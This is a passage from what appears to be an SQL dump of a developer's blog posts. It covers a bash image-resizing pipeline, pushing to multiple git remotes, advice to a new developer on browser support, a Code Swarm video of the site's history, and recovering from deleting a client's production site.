        <span class="nv">file_ext</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="si">${</span><span class="nv">found_file</span><span class="si">}</span> <span class="p">|</span> rev <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f <span class="m">1</span> <span class="p">|</span> rev <span class="p">|</span> cut -d <span class="s1">&#39;.&#39;</span> -f <span class="m">2</span><span class="k">)</span>
        <span class="nv">file_type</span><span class="o">=</span><span class="k">$(</span>get_type <span class="si">${</span><span class="nv">found_file</span><span class="si">}</span><span class="k">)</span>
        <span class="nv">size_shape</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="si">${</span><span class="nv">found_file</span><span class="si">}</span> <span class="p">|</span> rev <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f <span class="m">2</span> <span class="p">|</span> rev<span class="k">)</span>
        <span class="nv">shape</span><span class="o">=</span><span class="si">${</span><span class="nv">size_shape</span><span class="p">: -1</span><span class="si">}</span>
        <span class="nv">size</span><span class="o">=</span><span class="si">${</span><span class="nv">size_shape</span><span class="p">:</span><span class="k">:-</span><span class="nv">1</span><span class="si">}</span>

        <span class="c1"># &#39;convert&#39; needs XSIZExYSIZE and &#39;cwebp&#39; needs XSIZE YSIZE so doubling up variables to use this later</span>
        <span class="k">if</span> <span class="o">[[</span> <span class="si">${</span><span class="nv">shape</span><span class="si">}</span> <span class="o">=</span> <span class="s1">&#39;x&#39;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
            <span class="nv">direction</span><span class="o">=</span><span class="s1">&#39;&#39;</span>
            <span class="nv">x</span><span class="o">=</span><span class="si">${</span><span class="nv">size</span><span class="si">}</span>
            <span class="nv">y</span><span class="o">=</span><span class="m">0</span>
        <span class="k">else</span>
            <span class="nv">direction</span><span class="o">=</span>x
            <span class="nv">y</span><span class="o">=</span><span class="si">${</span><span class="nv">size</span><span class="si">}</span>
            <span class="nv">x</span><span class="o">=</span><span class="m">0</span>
        <span class="k">fi</span>

        <span class="k">if</span> <span class="o">[[</span> <span class="si">${</span><span class="nv">file_type</span><span class="si">}</span> <span class="o">=</span> <span class="s1">&#39;jpg&#39;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
            convert <span class="si">${</span><span class="nv">found_file</span><span class="si">}</span> -resize <span class="si">${</span><span class="nv">direction</span><span class="si">}${</span><span class="nv">size</span><span class="si">}</span> finished/<span class="si">${</span><span class="nv">file_name</span><span class="si">}</span>_<span class="si">${</span><span class="nv">size_shape</span><span class="si">}</span>.<span class="si">${</span><span class="nv">file_ext</span><span class="si">}</span> <span class="p">&amp;</span>&gt; /dev/null
        <span class="k">fi</span>

        <span class="k">if</span> <span class="o">[[</span> <span class="si">${</span><span class="nv">file_type</span><span class="si">}</span> <span class="o">=</span> <span class="s1">&#39;png&#39;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
            convert <span class="si">${</span><span class="nv">found_file</span><span class="si">}</span> -resize <span class="si">${</span><span class="nv">direction</span><span class="si">}${</span><span class="nv">size</span><span class="si">}</span> finished/<span class="si">${</span><span class="nv">file_name</span><span class="si">}</span>_<span class="si">${</span><span class="nv">size_shape</span><span class="si">}</span>.<span class="si">${</span><span class="nv">file_ext</span><span class="si">}</span> <span class="p">&amp;</span>&gt; /dev/null
        <span class="k">fi</span>

        <span class="k">if</span> <span class="o">[[</span> <span class="si">${</span><span class="nv">file_type</span><span class="si">}</span> <span class="o">=</span> <span class="s1">&#39;webp&#39;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
            cwebp <span class="si">${</span><span class="nv">found_file</span><span class="si">}</span> -mt -resize <span class="si">${</span><span class="nv">x</span><span class="si">}</span> <span class="si">${</span><span class="nv">y</span><span class="si">}</span> -o finished/<span class="si">${</span><span class="nv">file_name</span><span class="si">}</span>_<span class="si">${</span><span class="nv">size_shape</span><span class="si">}</span>.<span class="si">${</span><span class="nv">file_ext</span><span class="si">}</span> <span class="p">&amp;</span>&gt; /dev/null
        <span class="k">fi</span>

        rm <span class="si">${</span><span class="nv">found_file</span><span class="si">}</span>
    <span class="k">done</span>
</pre></div>


<p>The <code>functions.sh</code> file has a function in it <code>file_type</code> that return the self reported <code>file</code> type.</p>
<p>The interesting part here is that the file sizes converted to are dynamically calculated by the names of the folders supplied in both the x and y size. No cropping occurs, and it will also attempt to resize bigger as it assumes you know what you are doing.</p>
<h3 id="finished">Finished</h3>
<p>The final output end up like this:</p>
<div class="codehilite"><pre><span></span>house_300x218.png
house_551x400.png
house_700x508.png
house.flif
house_300x218.webp
house_551x400.webp
house_700x508.webp
house.png
</pre></div>


<p>In the resizer there were three folders: 300x, 400y and 700x. Include the <code>flif</code> and the original you have all the images you need to make the <code>&lt;picture&gt;</code> and <code>srcset</code> work.</p>
<h3 id="putting-it-all-together">Putting it all together</h3>
<p>Running these can be done like this (from a central/main script):</p>
<div class="codehilite"><pre><span></span>./drop.sh <span class="si">${</span><span class="nv">1</span><span class="si">}</span> <span class="p">&amp;</span>
./finished.sh <span class="si">${</span><span class="nv">2</span><span class="si">}</span> <span class="p">&amp;</span>

formatter/run.sh <span class="p">&amp;</span>
resizer/run.sh <span class="p">&amp;</span>
renamer/run.sh <span class="p">&amp;</span>
</pre></div>


<p><code>${1}</code> and <code>${2}</code> are the command line arguments for drop folder to watch and output folder respectively. Each child script has to be run as a background process for the aforementioned reason of <code>inotifywait</code> blocking the process.</p>
<p>Done.</p>
<aside>
The `picture` tag has one caveat that might be non obvious: while it will skip over file formats that it doesn''t recognise, if the tag suggests a format that it does recognise but the file doesn''t exist, then a 404 is returned for the whole image and the next format in the tag is not looked at, even if the file were to exist. Be aware.
</aside>','2019-04-28 10:56:04.45941','2019-04-28 10:56:04.45941','<p>With the advent of the <code>&lt;picture&gt;</code> tag and the general support of media-queries, it is time to automate image production.</p>',NULL),
	 (23,'Pushing to multiple git repositories','pushing-to-multiple-git-repositories','blog','<p>git is a distributed version control. Distributed. While you can have a single <code>master</code> remote it can be very handy to push changes to several remotes while onyl pulling from one. Here is how I do it.</p>
<p>Open up the <code>.git/config</code> file in your repository</p>
<p>Inside this there are several sections that are of interest. The following is a bog standard file for a newly <code>initialise</code>''d repository.</p>
<div class="codehilite"><pre><span></span><span class="k">[core]</span>
    <span class="na">repositoryformatversion</span> <span class="o">=</span> <span class="s">0</span>
    <span class="na">filemode</span> <span class="o">=</span> <span class="s">true</span>
    <span class="na">bare</span> <span class="o">=</span> <span class="s">false</span>
    <span class="na">logallrefupdates</span> <span class="o">=</span> <span class="s">true</span>
</pre></div>


<p>Great stuff.</p>
<p>Now let''s add a remote to push changes to:</p>
<p><code>git remote add github git@github.com:dougmiller/theMetaCityArticles.git</code></p>
<p>which now gives us</p>
<div class="codehilite"><pre><span></span><span class="k">[core]</span>
    <span class="na">repositoryformatversion</span> <span class="o">=</span> <span class="s">0</span>
    <span class="na">filemode</span> <span class="o">=</span> <span class="s">true</span>
    <span class="na">bare</span> <span class="o">=</span> <span class="s">false</span>
    <span class="na">logallrefupdates</span> <span class="o">=</span> <span class="s">true</span>
<span class="k">[remote &quot;github&quot;]</span>
    <span class="na">url</span> <span class="o">=</span> <span class="s">git@github.com:dougmiller/theMetaCityArticles.git</span>
    <span class="na">fetch</span> <span class="o">=</span> <span class="s">+refs/heads/*:refs/remotes/github/*</span>
</pre></div>


<p>We can of course add as many of these as we like</p>
<p><code>git add remote tmc doug@themetacity.com:theMetaCityArticles.git</code></p>
<p>which unsurprisingly adds a second remote</p>
<div class="codehilite"><pre><span></span><span class="k">[core]</span>
    <span class="na">repositoryformatversion</span> <span class="o">=</span> <span class="s">0</span>
    <span class="na">filemode</span> <span class="o">=</span> <span class="s">true</span>
    <span class="na">bare</span> <span class="o">=</span> <span class="s">false</span>
    <span class="na">logallrefupdates</span> <span class="o">=</span> <span class="s">true</span>
<span class="k">[remote &quot;github&quot;]</span>
    <span class="na">url</span> <span class="o">=</span> <span class="s">git@github.com:dougmiller/theMetaCityArticles.git</span>
    <span class="na">fetch</span> <span class="o">=</span> <span class="s">+refs/heads/*:refs/remotes/github/*</span>
<span class="k">[remote &quot;tmc&quot;]</span>
    <span class="na">url</span> <span class="o">=</span> <span class="s">doug@themetacity.com:theMetaCityArticles.git</span>
    <span class="na">fetch</span> <span class="o">=</span> <span class="s">+refs/heads/*:refs/remotes/tmc/*</span>
</pre></div>


<p>See what git thinks about where it can push and pull to: <code>git remote -v</code></p>
<div class="codehilite"><pre><span></span><span class="n">github</span><span class="w">  </span><span class="n">git</span><span class="nv">@github</span><span class="p">.</span><span class="nl">com</span><span class="p">:</span><span class="n">dougmiller</span><span class="o">/</span><span class="n">theMetaCityArticles</span><span class="p">.</span><span class="n">git</span><span class="w"> </span><span class="p">(</span><span class="k">fetch</span><span class="p">)</span><span class="w"></span>
<span class="n">github</span><span class="w">  </span><span class="n">git</span><span class="nv">@github</span><span class="p">.</span><span class="nl">com</span><span class="p">:</span><span class="n">dougmiller</span><span class="o">/</span><span class="n">theMetaCityArticles</span><span class="p">.</span><span class="n">git</span><span class="w"> </span><span class="p">(</span><span class="n">push</span><span class="p">)</span><span class="w"></span>
<span class="n">tmc</span><span class="w"> </span><span class="n">doug</span><span class="nv">@themetacity</span><span class="p">.</span><span class="nl">com</span><span class="p">:</span><span class="n">theMetaCityArticles</span><span class="p">.</span><span class="n">git</span><span class="w"> </span><span class="p">(</span><span class="k">fetch</span><span class="p">)</span><span class="w"></span>
<span class="n">tmc</span><span class="w"> </span><span class="n">doug</span><span class="nv">@themetacity</span><span class="p">.</span><span class="nl">com</span><span class="p">:</span><span class="n">theMetaCityArticles</span><span class="p">.</span><span class="n">git</span><span class="w"> </span><span class="p">(</span><span class="n">push</span><span class="p">)</span><span class="w"></span>
</pre></div>


<h2 id="you-have-commitd">You have <code>commit</code>''d</h2>
<p>After doing a commit, to get the changes to each remote you could do:</p>
<p><code>git push github master &amp;&amp; git push tmc master</code></p>
<p>This will get the data to both remotes but is a bit clunky. A cleaner solution can be to edit a remote in the config to have two push locations.</p>
<div class="codehilite"><pre><span></span><span class="k">[core]</span>
    <span class="na">repositoryformatversion</span> <span class="o">=</span> <span class="s">0</span>
    <span class="na">filemode</span> <span class="o">=</span> <span class="s">true</span>
    <span class="na">bare</span> <span class="o">=</span> <span class="s">false</span>
    <span class="na">logallrefupdates</span> <span class="o">=</span> <span class="s">true</span>
<span class="k">[remote &quot;tmc&quot;]</span>
    <span class="na">url</span> <span class="o">=</span> <span class="s">doug@themetacity.com:theMetaCityArticles.git</span>
    <span class="na">fetch</span> <span class="o">=</span> <span class="s">+refs/heads/*:refs/remotes/tmc/*</span>
    <span class="na">pushurl</span> <span class="o">=</span> <span class="s">doug@themetacity.com:theMetaCityArticles.git</span>
    <span class="na">pushurl</span> <span class="o">=</span> <span class="s">git@github.com:dougmiller/theMetaCityArticles.git</span>
</pre></div>


<p><code>git remote -v</code> again to see out changes.</p>
<div class="codehilite"><pre><span></span><span class="n">origin</span><span class="w">  </span><span class="n">doug</span><span class="nv">@themetacity</span><span class="p">.</span><span class="nl">com</span><span class="p">:</span><span class="n">theMetaCityArticles</span><span class="p">.</span><span class="n">git</span><span class="w"> </span><span class="p">(</span><span class="k">fetch</span><span class="p">)</span><span class="w"></span>
<span class="n">origin</span><span class="w">  </span><span class="n">doug</span><span class="nv">@themetacity</span><span class="p">.</span><span class="nl">com</span><span class="p">:</span><span class="n">theMetaCityArticles</span><span class="p">.</span><span class="n">git</span><span class="w"> </span><span class="p">(</span><span class="n">push</span><span class="p">)</span><span class="w"></span>
<span class="n">origin</span><span class="w">  </span><span class="n">git</span><span class="nv">@github</span><span class="p">.</span><span class="nl">com</span><span class="p">:</span><span class="n">dougmiller</span><span class="o">/</span><span class="n">theMetaCityArticles</span><span class="p">.</span><span class="n">git</span><span class="w"> </span><span class="p">(</span><span class="n">push</span><span class="p">)</span><span class="w"></span>
</pre></div>


<p>The <code>(fetch)</code> line is taken from the <code>url</code> setting while the two <code>(push)</code> lines are from the <code>pushurl</code> line. The astute amongst you will notice that the <code>(fetch)</code> line does not have to match any of the push urls (in effect: A does some work -&gt; B pull in changes then pushes -&gt; C &amp; D). In the case of working on theMetaCity articles, the GitHub repo is a public read only version used to gather feedback if people are interested.</p>
<p>Once you do a <code>push</code>, it works through the <code>pushurl</code>s in order, trying to send the changes and moving onto the next in the list on success or failure.</p>','2019-08-18 21:23:43.112453','2019-08-18 21:23:43.112453','<p>Avoiding single point of failure when pushing git to a single repo (GitHub) by sending to multiple remotes at once.</p>',NULL),
	 (24,'A brief note to young players','a-brief-note-to-young-players','blog','<p>A while ago I left this note to someone new to the world of development who was frustrated with the speed at which new features are added to web browsers.</p>
<blockquote cite="https://www.reddit.com/r/programming/comments/93502u/blink_intent_to_deprecate_and_remove_shadow_dom/e3b4g1v/">
<p>Yeah this part is really starting to piss me off to be honest, Firefox STILL doesn''t support components, Firefox STILL doesn''t support HTML 5.1 dialogs (native modal support so that we don''t have to keep doing modals in JS), I''ve literally been waiting for years for other browsers to catch up with Chrome so we can finally start using these technologies. I really do like Firefox but lately it seems supporting the latest standards no longer seems their priority and that makes me sad.
</p>
</blockquote>

<p><cite>– robvl</cite></p>
<p>And my response:</p>
<blockquote cite="https://www.reddit.com/r/programming/comments/93502u/blink_intent_to_deprecate_and_remove_shadow_dom/e3boab6/">
<p>"seems their priority"

You talk as if Firefox devs are these nebulous far off being that are somehow separate from us. I get that you like firefox and want it to be great and are coming from a place of frustration, but please (for everyone reading this) remember that Mozilla it made up of real people with real budgets and timelines and issues and competing attentions and priorities. It is hard to make this whole thing work. There are only so many hours in the day.

Since you really like ff, could you spare 10 minutes to report a bug or write some tests to help out? Review the spec or comment on the current implementation. There must be something that you can do that will help get everyone closer to these features.

Again, I know it is borne out of frustration but there is so much you can do to help everyone get past it.
</p>
</blockquote>

<p><cite>– me</cite></p>
<p>While my original point still stands (be patient, dev is hard and expensive, help if you can) I feel there is a point not said.</p>
<p>To which: the perceived issues you are dealing with are Sysiphusian in nature. Having the solution in place for this issue won''t magically solve all your problems it only kicks the can down the road. You will just run into the next problem and the next one after that and the one after that one too until the day you stop working.</p>
<p>I would argue that it is a sign of a maturing dev when they can accept this reality and work with it to produce software and solve problems rather than bemoan the situation and not move forward.</p>
<p>My personal bug bear was inline/first-class citizenship of SVG that came with Firefox 4.0. What a glorious day that was when it shipped! We could have SVG everywhere and in everything, birds would sing and babies would be born. So I went about and put SVGs directly in to pages.</p>
<p>Nothing changed.</p>
<p>Previous to that I needed to either put them in via <code>&lt;object&gt;</code> tags or equivalent to have them show up. It was an annoying extra layer and hoop to jump though that took extra effort and tooling to solve. But solve it you do and move on to the next problem. And you do move on. That''s the secret here, you deal with what you have in-font of you, make compromises, push back where you can and ultimately accept your fate. Getting angry and frustrated, while cathartic, doesn''t help with the situation.</p>
<p>And it is Sysiphusian task as because as soon as you overcome one challenge the next rears its ugly head. If you can manage to push long enough and hard enough, you can ship some pretty OK software maybe.</p>
<p>Back to the original poster: what would having the native controls then lead to? One less dependency in the page? While that is a nice ideal to have, the problem is solved enough that it is time to move on to the next issue.</p>
<p>Which leads back to my next issue. Having <code>Wallclock</code> implemented for SVG would make a project I am working on so much easier and cleaner to implement but alas we are not getting it in 1.2, but maybe we are in 2 (maybe I should do it if I were to listen to my own advice).</p>
<p>So back to the mountain...</p>','2019-10-07 13:02:03.068374','2019-10-07 13:02:03.068374','<p>A followup to a note I left to someone new to this game.</p>',NULL),
	 (7,'Code Swarm of the MetaCity 2006 - 2014','code-swarm-of-the-metacity-2006-2014','blog','<p>I started the MetaCity website as part of a University project nearly 10 years ago. It has come a long way in that time, and I have learnt a lot along with it. This is the Code Swarm of the git history (migrated from SVN ~3 years ago). Thankfully I have the day dot as part of that history.</p>
<video width="800" height="600" controls data-poster="https://assets.themetacity.com/video/codeswarm200114poster.svg">
    <source src="https://assets.themetacity.com/video/code_swarm200114.avi" type=''video/avi;codec="FMP4"''>
    <source src="https://assets.themetacity.com/video/code_swarm200114.webm" type=''video/webm;codecs="vp8, vorbis"''>
</video>

<p>The repo for this can be found on <a href="/github" title="My GitHub page">my github page</a>. Feel free to do whatever you like with it.</p>
<p><a href="http://code.google.com/p/codeswarm/" title="Original Code Swarm on Google Code">Code Swarm itself has been around</a> for a while now too. The main repo is starting to show its age with compatability issues cropping up. I would reccomend <a href="https://github.com/rictic/code_swarm" title="Rictic''s fork of Code Swarm on GitHub">looking at Peter Burn''s fork</a> as he has refined a lot of the tools used and brought up minimum versions to something approaching what is availible today. Still on Python 2 but it runs without hassle.</p>','2014-02-03 22:06:07','2014-02-03 22:06:07','<p>Ten years of vis on theMetaCity git repository</p>',NULL),
	 (21,'So you deleted your client''s production website','so-you-deleted-your-clients-production-website','blog','<p>Step that might be helpful if you accidentally delete your clients production site.</p>
<h2 id="step-1-dont-panic">Step 1: Don''t panic</h2>
<p>While scary and gut-wrenching, panicking will only make the situation worse. The first thing is to take stock of what has happened. Has the site really truly been deleted or has something less nasty happened? Is there an immediate solution?</p>
<h2 id="step-2-talk-to-your-client">Step 2: Talk to your client</h2>
<p>Pick up the phone and call your client. Get ahead of them on this. Do not wait for them to try to use the site only to see nothing appear. Call them.</p>
<p>Explain that you fucked up. Explain that they are now your number one client until this has been fixed (they were already #1 right? Right?).</p>
<h2 id="step-3-get-to-work">Step 3: Get to work</h2>
<p>Give them a plan to get the site back. "We are going to restore from backup. It will take ~1 hour."</p>
<p>Keep them informed. Stay on the phone if it is going to be done in the next ten minutes otherwise ring them with an update every ten (or whatever they want). Do not leave them thinking you have run off. Even if you do not have new information, let them know that you have nothing new. They need to know you are still working for them.</p>
<h2 id="step-4-apologise-and-improve">Step 4: Apologise and improve</h2>
<p>Once the dust has settled after the site is backup send them an apology bottle of their intoxicant of choice, and an explanation accepting fault with a layout of the changes to policy that means this can''t happen again.</p>
<p>Failing all that: hope your indemnity insurance is paid up</p>
<h2 id="story-time">Story time</h2>
<p>Thankfully I have never deleted a production site. This article was inspired by an event where someone else at the place I worked at the time did so on a Friday morning while cleaning up old accounts on a shared hosting server. The usual process in this situation failed as the backups did not work (site was ~5 years old, and the backups were incremental diffs which fell on their face when submitted for restoration). The site was down for ~30 hours before a copy of the Wayback Machine could be downloaded and put in place. The backups were eventually fixed, and the site was restored after ~48 hours. The new policy is to suspend accounts for a year before deletion and also to have a copy of the account on a local (in the office) removable drive. Saved us a couple of times (and been profitable once when a client from a few years previous came back).</p>','2019-04-27 09:31:21.472137','2019-04-27 09:31:21.472137','<p>What to do if you accidentally delete your clients production website</p>',NULL);
